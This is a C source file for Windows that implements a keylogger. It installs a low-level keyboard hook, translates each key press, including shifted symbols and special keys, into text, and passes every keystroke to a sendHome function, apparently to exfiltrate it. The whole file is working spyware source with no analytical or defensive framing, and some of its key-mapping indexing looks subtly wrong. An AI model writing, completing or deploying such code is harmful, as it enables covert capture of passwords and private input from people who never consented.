#include "config.h"

void keylogger()
{
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHook, 0, 0);
	MSG msg;

	while (!GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	static char map[][7] =
	{
		"","","","","","","","","[BSP]","\t",                "","","","\n","","","","","","[PSE]",                              //0-19
		"[CAP]","","","","","","","[ESC]","","",             "",""," ","[PUP]","[PDN]","[END]","[HME]","[LAR]","[UAR]","[RAR]", //20-39
		"[DAR]","","","","[PSC]","[INS]","[DEL]","","0","1", "2","3","4","5","6","7","8","9","","",                             //40-59
		"","","","","","A","B","C","D","E",                  "F","G","H","I","J","K","L","M","N","O",                           //60-79
		"P","Q","R","S","T","U","V","W","X","Y",             "Z","[LWN]","[RWN]","","","","0","1","2","3",                      //80-99
		"4","5","6","7","8","9","*","+","","-",              ".","\\","[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]","[F8]",  //100-119
		"[F9]","[F10]","[F11]","[F12]","","","","","","",    "","","","","","","","","","",                                     //120-139
		"","","","","[NLK]","[SLK]","","","","",             "","","","","","","","","","",                                     //140-159
		"","","[LCT]","[RCT]","[LAL]","[RAL]","","","","",   "","","","[MTE]","[VDN]","[VUP]","","","","",                      //160-179
		"","","","","","",";","=",",","-",                   ".","/","`","","","","","","","",                                  //180-199
		"","","","","","","","","","",                       "","","","","","","","","","[",                                    //200-219
		"\\","]","'","","","","","",""                                                                                          //220-228
	};

	static char* shiftMap[] =
	{
		")","!","@","#","$","%%","^","&","*","(",":","+","<","_",">","?","~","{","|","}","\""
	};

	TCHAR temp[10];
	char string[10];
	size_t nNumCharConverted;

	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
		{
			PKBDLLHOOKSTRUCT hookStruct = (PKBDLLHOOKSTRUCT)lParam;
			SHORT shift = GetAsyncKeyState(VK_SHIFT);
			int code = hookStruct->vkCode;

			if (!shift && code >= 'A' && code <= 'Z') 
				sprintf_s(string, 10, "%c", code + 32);
			else if (shift && code >= 48  && code <= 57)  
				sprintf_s(string, 10, shiftMap[code - 48]);
			else if (shift && code >= 186 && code <= 192) 
				sprintf_s(string, 10, shiftMap[code - 176]);
			else if (shift && code >= 219 && code <= 222) 
				sprintf_s(string, 10, shiftMap[code - 202]);
			else 
				sprintf_s(string, 10, "%s", map[code]);
	
			sendHome(string);
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}